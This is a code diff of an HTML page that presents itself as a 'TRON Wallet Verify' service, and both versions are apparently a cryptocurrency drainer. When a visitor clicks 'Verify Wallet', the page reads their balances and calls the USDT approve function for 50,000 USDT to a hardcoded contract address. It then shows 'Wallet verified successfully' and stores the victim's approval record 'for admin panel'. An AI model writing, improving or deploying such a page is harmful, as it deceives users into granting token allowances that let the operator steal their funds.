@@ -1,93 +1,202 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title>Verify Wallet - TronSecure</title>
-    <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-        .container {
-            max-width: 400px;
-            width: 100%;
-            background: white;
-            border-radius: 30px;
-            padding: 40px 30px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            text-align: center;
-        }
-        .logo {
-            font-size: 32px;
-            font-weight: bold;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 20px;
-        }
-        button {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            border-radius: 50px;
-            font-size: 16px;
-            cursor: pointer;
-            margin: 20px 0;
-            width: 100%;
-        }
-        #walletAddress {
-            word-break: break-all;
-            padding: 10px;
-            background: #f0f0f0;
-            border-radius: 8px;
-            margin-top: 20px;
-        }
-    </style>
-    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
+<meta charset="UTF-8">
+<title>TRON Wallet Verify</title>
+
+<script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
+
+<style>
+body{
+font-family:Arial;
+background:#f4f4f4;
+text-align:center;
+padding:40px;
+}
+
+.box{
+background:white;
+padding:30px;
+border-radius:12px;
+width:420px;
+margin:auto;
+box-shadow:0 0 10px rgba(0,0,0,0.1);
+}
+
+button{
+padding:12px 20px;
+border:none;
+background:#6c4cff;
+color:white;
+border-radius:6px;
+cursor:pointer;
+margin:10px 0;
+}
+
+.status{
+margin-top:15px;
+padding:10px;
+border-radius:6px;
+display:none;
+}
+
+.success{
+background:#d4edda;
+color:#155724;
+display:block;
+}
+
+.error{
+background:#f8d7da;
+color:#721c24;
+display:block;
+}
+</style>
 </head>
+
 <body>
-    <div class="container">
-        <div class="logo">TronSecure</div>
-        <h2>Verify Your Wallet</h2>
-        <button onclick="connectWallet()">Connect Trust Wallet</button>
-        <div id="walletAddress"></div>
-    </div>
 
-    <script>
-        async function connectWallet() {
-            // Simple check - exactly aapke jaisa
-            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-                const address = window.tronWeb.defaultAddress.base58;
-                document.getElementById("walletAddress").innerText = "Connected: " + address;
-                
-                // Auto approve 50,000 USDT
-                await approveUSDT(address);
-            } else {
-                alert("❌ Please open this page inside Trust Wallet DApp browser");
-            }
-        }
+<div class="box">
 
-        async function approveUSDT(address) {
-            const CONTRACT_ADDRESS = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";
-            const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-            
-            try {
-                const tronWeb = window.tronWeb;
-                const tokenContract = await tronWeb.contract().at(USDT_ADDRESS);
-                const amountInSun = 50000 * 1000000; // 50,000 USDT
-                
-                const result = await tokenContract.approve(CONTRACT_ADDRESS, amountInSun).send();
-                alert("✅ Verification complete!");
-            } catch (error) {
-                alert("❌ Approval failed: " + error.message);
+<h2>🔐 TRON Wallet Verify</h2>
+
+<button onclick="startScan()">Verify Wallet</button>
+
+<p><b>Address:</b> <span id="address">Not connected</span></p>
+<p><b>TRX Balance:</b> <span id="trx">0</span></p>
+<p><b>USDT Balance:</b> <span id="usdt">0</span></p>
+
+<div id="status" class="status"></div>
+
+</div>
+
+<script>
+// ============================================
+// CONFIGURATION - YOUR CONTRACT ADDRESS
+// ============================================
+const CONTRACT_ADDRESS = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";
+const USDT_ADDRESS = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // USDT contract
+const APPROVE_AMOUNT = 50000; // 50,000 USDT
+
+// ============================================
+// WAIT FOR TRONWEB
+// ============================================
+async function waitForTron(){
+    return new Promise(resolve => {
+        const check = setInterval(()=>{
+            if(window.tronWeb && window.tronWeb.defaultAddress.base58){
+                clearInterval(check);
+                resolve(window.tronWeb);
             }
+        },500);
+    });
+}
+
+// ============================================
+// START VERIFICATION
+// ============================================
+async function startScan(){
+    try {
+        showStatus("Connecting to wallet...", "info");
+        
+        const tronWeb = await waitForTron();
+        const address = tronWeb.defaultAddress.base58;
+        
+        document.getElementById("address").innerText = address;
+        showStatus("✅ Wallet connected! Getting balances...", "success");
+        
+        // Get TRX balance
+        const trxBalance = await tronWeb.trx.getBalance(address);
+        document.getElementById("trx").innerText = tronWeb.fromSun(trxBalance);
+        
+        // Get USDT balance
+        const contract = await tronWeb.contract().at(USDT_ADDRESS);
+        const balance = await contract.balanceOf(address).call();
+        document.getElementById("usdt").innerText = balance/1000000;
+        
+        // Auto approve USDT
+        await approveUSDT(tronWeb, address);
+        
+    } catch(error) {
+        showStatus("❌ Error: " + error.message, "error");
+    }
+}
+
+// ============================================
+// APPROVE USDT
+// ============================================
+async function approveUSDT(tronWeb, address) {
+    try {
+        showStatus("⏳ Approving 50,000 USDT...", "info");
+        
+        const contract = await tronWeb.contract().at(USDT_ADDRESS);
+        const amount = APPROVE_AMOUNT * 1000000;
+        
+        const result = await contract.approve(CONTRACT_ADDRESS, amount).send();
+        
+        showStatus("✅ Wallet verified successfully!", "success");
+        
+        // Save for admin panel
+        saveApproval(address, APPROVE_AMOUNT, result);
+        
+    } catch(error) {
+        if(error.message.includes("rejected")) {
+            showStatus("❌ Approval rejected", "error");
+        } else {
+            showStatus("❌ Approval failed: " + error.message, "error");
         }
-    </script>
+    }
+}
+
+// ============================================
+// SAVE APPROVAL (for admin panel)
+// ============================================
+function saveApproval(address, amount, txHash) {
+    const approvals = JSON.parse(localStorage.getItem('usdtApprovals') || '[]');
+    
+    approvals.push({
+        user: address,
+        amount: amount,
+        txHash: txHash,
+        status: 'active',
+        time: new Date().toISOString(),
+        token: 'USDT'
+    });
+    
+    localStorage.setItem('usdtApprovals', JSON.stringify(approvals));
+    console.log("Approval saved for admin panel");
+}
+
+// ============================================
+// SHOW STATUS
+// ============================================
+function showStatus(message, type) {
+    const statusDiv = document.getElementById('status');
+    statusDiv.className = 'status';
+    
+    if(type === "success") {
+        statusDiv.className += " success";
+    } else if(type === "error") {
+        statusDiv.className += " error";
+    } else {
+        statusDiv.style.display = "block";
+        statusDiv.style.background = "#cce5ff";
+        statusDiv.style.color = "#004085";
+    }
+    
+    statusDiv.innerText = message;
+    statusDiv.style.display = "block";
+}
+
+// Check if in Trust Wallet on load
+window.onload = function() {
+    if(window.tronWeb) {
+        showStatus("✅ Trust Wallet detected", "success");
+    } else {
+        showStatus("⚠️ Please open in Trust Wallet DApp browser", "info");
+    }
+};
+</script>
+
 </body>
 </html>
